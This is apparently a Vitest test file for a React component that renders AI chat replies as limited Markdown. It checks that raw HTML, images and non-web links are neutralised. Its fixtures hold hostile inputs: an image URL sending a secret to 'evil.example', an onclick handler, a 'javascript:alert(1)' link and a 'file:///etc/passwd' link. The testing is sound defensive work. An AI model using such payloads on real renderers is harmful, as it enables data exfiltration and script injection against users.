// @vitest-environment happy-dom
import { cleanup, render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, describe, expect, it, vi } from "vitest";
import { ReplyText } from "./ReplyText.js";

afterEach(cleanup);

const shown = (text: string) => {
  const onOpenLink = vi.fn();
  const { container } = render(<ReplyText text={text} onOpenLink={onOpenLink} />);
  return { container, onOpenLink };
};

describe("ReplyText (product/14 §6.4)", () => {
  it("shows limited Markdown: emphasis, code, lists", () => {
    const { container } = shown("I made the title **shorter**:\n\n- `Fresh bread`\n- *daily*");

    expect(container.querySelector("strong")?.textContent).toBe("shorter");
    expect(container.querySelector("code")?.textContent).toBe("Fresh bread");
    expect(container.querySelectorAll("li")).toHaveLength(2);
    expect(container.querySelector("em")?.textContent).toBe("daily");
  });

  it("shows raw HTML as its text, never as markup", () => {
    const { container } = shown(
      'Done. <img src="https://evil.example/x.png"> <b onclick="x()">hi</b>',
    );

    expect(container.querySelector("b")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain('<b onclick="x()">');
  });

  it("never loads an image, only names it", () => {
    const { container } = shown("![your logo](https://evil.example/leak?site=secret)");

    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("Image not shown: your logo");
    expect(container.textContent).not.toContain("evil.example");
  });

  it("shows a link's address beside it, and opens it only when clicked", async () => {
    const { onOpenLink } = shown("See [our hours](https://bakery.example/hours).");
    const link = screen.getByRole("link", { name: /our hours/ });

    expect(link.textContent).toContain("(https://bakery.example/hours)");
    expect(onOpenLink).not.toHaveBeenCalled();
    await userEvent.click(link);
    expect(onOpenLink).toHaveBeenCalledWith("https://bakery.example/hours");
  });

  it("shows a link's address tidied, and opens it as the reply wrote it (main checks that)", async () => {
    const { onOpenLink } = shown("[Home](HTTPS://Bakery.example)");
    const link = screen.getByRole("link", { name: /Home/ });

    expect(link.textContent).toContain("(https://bakery.example/)");
    await userEvent.click(link);
    expect(onOpenLink).toHaveBeenCalledWith("HTTPS://Bakery.example");
  });

  it("shows a link that isn't a web address as its text", () => {
    shown("[click me](javascript:alert(1)) and [mail](file:///etc/passwd)");

    expect(screen.queryAllByRole("link")).toHaveLength(0);
    expect(screen.getByText(/click me/)).toBeDefined();
  });

  it("draws part of a reply still streaming", () => {
    const { container } = shown("Here is a list:\n\n- one\n- tw");

    expect(container.querySelectorAll("li")).toHaveLength(2);
  });
});
